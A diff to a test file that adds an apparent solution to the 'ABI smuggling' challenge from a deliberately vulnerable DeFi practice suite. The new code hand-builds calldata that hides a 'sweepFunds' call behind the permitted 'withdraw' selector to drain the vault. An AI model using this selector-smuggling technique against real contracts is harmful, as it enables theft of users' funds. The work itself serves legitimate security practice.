@@ -49,17 +49,68 @@ describe('[Challenge] ABI smuggling', function () {
 
         // Try to fast forward 15 days and just call the withdraw function
         // Print out the calldata to understand how it works
-
         const fastForward = await time.increase(15 * 24 * 60 * 60); // 15 days in seconds
-        const calldata = await vault.interface.encodeFunctionData(
+        let calldata = await vault.interface.encodeFunctionData(
             'withdraw', [
                 token.address,
                 player.address,
                 1n ** 18n
             ]
         )
-        const withdraw = await vault.connect(player).execute(vault.address, calldata)
-        console.log("Withdraw Txn: ", withdraw);
+        console.log("--------------Calldata -----------------");
+        console.log("Calldata[function selector]" , calldata.slice(0, 34))
+        console.log("Calldata[token address]", calldata.slice(34, 98))
+        console.log("Calldata[player address]", calldata.slice(98, 162))
+        console.log("Calldata[amount]", calldata.slice(162, calldata.length))
+        // console.log("Calldata", calldata)
+
+
+        // const withdraw = await vault.connect(player).execute(vault.address, calldata)
+        // calldata = withdraw.data
+        // console.log("------------Transaction Calldata------------");
+        // console.log("Calldata[function selector]" , calldata.slice(0, 34))
+        // console.log("Calldata[target address]", calldata.slice(34, 98))
+        // console.log("Calldata[actionData offset]", calldata.slice(98, 137))
+        // console.log("Calldata[actionData size]", calldata.slice(137, 202))
+        // console.log("Calldata[actionData]", calldata.slice(202, calldata.length))
+        // console.log("Calldata", calldata)
+
+        // construct calldata to exploit the contract
+        const executeFunction = await vault.interface.getFunction("execute");
+        const executeSig = await vault.interface.getSighash(executeFunction); 
+
+        const vaultAddress = await ethers.utils.hexZeroPad(vault.address, 32);
+
+        const withdrawFunction = await vault.interface.getFunction("withdraw")
+        const withdrawSig = await vault.interface.getSighash(withdrawFunction);
+
+        const nops = await ethers.utils.hexZeroPad("0x0", 32);
+
+        const exploitOffset = await ethers.utils.hexZeroPad("0x64", 32);
+        const exploitSize = await ethers.utils.hexZeroPad("0x44", 32);
+
+        const exploitCalldata = await vault.interface.encodeFunctionData(
+            "sweepFunds", [
+                recovery.address, 
+                token.address
+            ]
+        )
+        const padding = await ethers.utils.hexZeroPad("0x0", 24);
+
+        const actionData = await ethers.utils.hexConcat(
+            [exploitOffset, 
+            nops, 
+            withdrawSig,
+            exploitSize, 
+            exploitCalldata,
+            padding]
+        )
+        const functionCallData = await ethers.utils.hexConcat([executeSig, vaultAddress, actionData])
+        const txn = await player.sendTransaction({to: vault.address, data: functionCallData})
+
+        console.log(functionCallData)
+
+
     });
 
     after(async function () {
